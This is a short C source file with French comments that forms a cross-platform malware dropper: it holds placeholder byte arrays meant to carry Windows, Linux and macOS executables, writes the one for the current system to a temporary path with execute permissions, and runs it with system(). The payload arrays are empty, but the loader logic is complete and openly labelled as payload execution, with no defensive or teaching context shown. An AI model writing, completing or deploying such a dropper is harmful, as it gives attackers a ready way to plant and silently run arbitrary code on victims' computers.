#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

// === INCLUSION DES BINAIRES EN HEXADECIMAL (À REMPLACER) ===
unsigned char payload_win[] = { /* Contenu du .exe ici */ };
unsigned int payload_win_len = sizeof(payload_win);

unsigned char payload_linux[] = { /* Contenu du binaire Linux ici */ };
unsigned int payload_linux_len = sizeof(payload_linux);

unsigned char payload_mac[] = { /* Contenu du binaire macOS ici */ };
unsigned int payload_mac_len = sizeof(payload_mac);

// === Fonction pour écrire le fichier binaire ===
int write_payload(const char *filename, unsigned char *data, unsigned int length) {
    int fd = open(filename, O_CREAT | O_WRONLY, 0755);
    if (fd < 0) {
        perror("Erreur d'écriture du fichier");
        return -1;
    }
    write(fd, data, length);
    close(fd);
    return 0;
}

int main() {
    char temp_path[256];

#ifdef _WIN32
    strcpy(temp_path, "C:\\Windows\\Temp\\payload.exe");
    write_payload(temp_path, payload_win, payload_win_len);
    printf("Execution du payload Windows...\n");
    system(temp_path);

#elif __linux__
    strcpy(temp_path, "/tmp/payload");
    write_payload(temp_path, payload_linux, payload_linux_len);
    printf("Execution du payload Linux...\n");
    system(temp_path);

#elif __APPLE__
    strcpy(temp_path, "/tmp/payload_mac");
    write_payload(temp_path, payload_mac, payload_mac_len);
    printf("Execution du payload macOS...\n");
    system(temp_path);
#endif

    return 0;
}
